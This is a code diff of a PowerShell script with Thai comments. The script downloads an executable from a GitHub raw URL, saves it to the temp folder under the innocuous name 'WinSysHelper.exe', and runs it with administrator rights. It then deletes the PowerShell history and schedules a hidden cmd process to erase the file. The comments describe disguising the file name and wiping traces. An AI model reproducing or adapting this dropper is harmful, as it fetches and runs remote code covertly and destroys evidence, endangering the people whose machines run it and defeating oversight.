@@ -1,30 +1,22 @@
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
-try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
 
-# 1. เตรียมไฟล์
+# 1. ตั้งชื่อไฟล์ให้เนียนและที่อยู่ไฟล์
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
 $output = "$env:TEMP\WinSysHelper.exe"
 
 # 2. โหลดไฟล์
 Invoke-WebRequest -Uri $url -OutFile $output
 
-# 3. รันแบบ Admin (ถ้ารันผ่าน PowerShell จะไม่ปิดตัวเองจนกว่าจะสั่ง)
+# 3. รันแบบ Admin และสั่งให้ลบตัวเองทิ้งเมื่อปิดโปรแกรม (ใช้คำสั่ง cmd ช่วย)
+# วิธีนี้จะทำให้ EXE เด้งขึ้นมาแน่นอน และ PowerShell จะปิดตัวเองได้ทันทีโดยไม่กวนการทำงาน
 Start-Process -FilePath $output -Verb RunAs
 
-# 4. รอให้โปรแกรมเริ่มทำงานก่อน 3 วินาที
-Start-Sleep -Seconds 3
-
-# 5. วนลูปเช็ค: ถ้ายังเห็นโปรแกรม "WinSysHelper" (หรือ BASX) ทำงานอยู่ ให้รอไปเรื่อยๆ
-# บาสต้องเช็คว่าใน Task Manager โปรแกรมบาสชื่ออะไร ถ้าชื่อ BASX ให้เปลี่ยนตรงนี้เป็น "BASX"
-while (Get-Process "WinSysHelper" -ErrorAction SilentlyContinue) {
-    Start-Sleep -Seconds 2
-}
-
-# 6. พอปิดโปรแกรมปุ๊บ ล้างร่องรอยทันที
-Remove-Item -Path $output -Force
-Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\WinSysHelper*" -Force
-Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" | Remove-Item -Force
+# 4. ใช้คำสั่งลบประวัติ PowerShell
+try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
 Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+
+# 5. สั่งล้างไฟล์ใน Temp แบบหน่วงเวลา (ใช้ cmd รันเบื้องหลังเพื่อรอเวลาลบ)
+Start-Process cmd -ArgumentList "/c timeout /t 10 && del /f /q `"$output`"" -WindowStyle Hidden
 
 exit
